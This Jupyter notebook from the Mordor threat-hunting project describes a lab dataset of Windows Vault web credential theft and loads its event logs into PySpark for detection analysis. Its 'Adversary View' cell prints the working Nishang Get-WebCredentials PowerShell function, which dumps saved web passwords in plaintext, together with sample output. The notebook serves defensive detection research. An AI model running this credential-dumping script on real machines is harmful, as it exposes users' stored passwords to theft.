{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "9e6c4f80",
   "metadata": {},
   "source": [
    "# Windows Vault Web Credentials"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c501f243",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3cb2484f",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/10/28 |\n",
    "| Modification Date | 2020/10/28 |\n",
    "| Tactics           | ['[TA0004](https://attack.mitre.org/tactics/TA0004)', '[TA0005](https://attack.mitre.org/tactics/TA0005)'] |\n",
    "| Techniques        | ['[T1055](https://attack.mitre.org/techniques/T1055)'] |\n",
    "| Tags              | None |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1ac83c61",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents threat actors accessing the Windows Vault and reading web credentials saved."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cc51d820",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "54158a0a",
   "metadata": {},
   "source": [
    "\n",
    "| Dataset Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/psh_windows_vault_web_credentials.zip](https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/psh_windows_vault_web_credentials.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3a2092ab",
   "metadata": {},
   "source": [
    "## Notebooks\n",
    "Notebooks created by the community leveraging the mordor datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8174a47d",
   "metadata": {},
   "source": [
    "\n",
    "| Author | Name | Link |\n",
    "|:-------|:-----|:-----|"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "aec8eea4",
   "metadata": {},
   "source": [
    "## Simulation Plan"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5a94edcd",
   "metadata": {},
   "source": [
    "\n",
    "| Environment | Tool Type | Module |\n",
    "|:------------|:----------|:-------|\n",
    "| Lab VM | Manual | [PowerShell](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b77569ae",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "Add Web Credentials\n",
    "-------------------\n",
    "PS > $pv = New-Object Windows.Security.Credentials.PasswordVault\n",
    "PS > $pw = New-Object Windows.Security.Credentials.PasswordCredential('http://ossemproject.com', 'pgustavo', 'Pass@Word')\n",
    "PS >$pv.Add($pw)\n",
    "\n",
    "Import Get-WebCredentials\n",
    "-------------------------\n",
    "function Get-WebCredentials\n",
    "{\n",
    "  <#\n",
    "  .SYNOPSIS\n",
    "  Nishang script to retrieve web credentials from Windows vault (requires PowerShell v3 and above)\n",
    "  .DESCRIPTION\n",
    "  This script can be used to retreive web credentiaks stored in Windows Valut from Windows 8 onwards. The script \n",
    "  also needs PowerShell v3 onwards and must be run from an elevated shell.\n",
    "  .EXAMPLE\n",
    "  PS > Get-WebCredentials\n",
    "  .LINK\n",
    "  https://github.com/samratashok/nishang\n",
    "  #>\n",
    "  [CmdletBinding()] Param ()\n",
    "  \n",
    "  \n",
    "  #http://stackoverflow.com/questions/9221245/how-do-i-store-and-retrieve-credentials-from-the-windows-vault-credential-manage\n",
    "  $ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]\n",
    "  $VaultObj = new-object Windows.Security.Credentials.PasswordVault\n",
    "  $VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ }\n",
    "}\n",
    "\n",
    "Run Get-WebCredentials\n",
    "----------------------\n",
    "PS C:\\Users\\wardog> Get-WebCredentials\n",
    "\n",
    "UserName Resource                Password  Properties\n",
    "-------- --------                --------  ----------\n",
    "pgustavo http://ossemproject.com Pass@Word {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], ...\n",
    "\n",
    "\n",
    "PS C:\\Users\\wardog>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "aa5efa57",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "86766043",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7fe20df8",
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "575ac196",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2240aa91",
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/psh_windows_vault_web_credentials.zip\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "17891ac6",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d8d04a5f",
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "'''\n",
    "SELECT Hostname,Channel,EventID, Count(*) as count\n",
    "FROM mordorTable\n",
    "GROUP BY Hostname,Channel,EventID\n",
    "ORDER BY count DESC\n",
    "'''\n",
    ")\n",
    "df.show(truncate=False)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "PySpark_Python3",
   "language": "python",
   "name": "pyspark3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
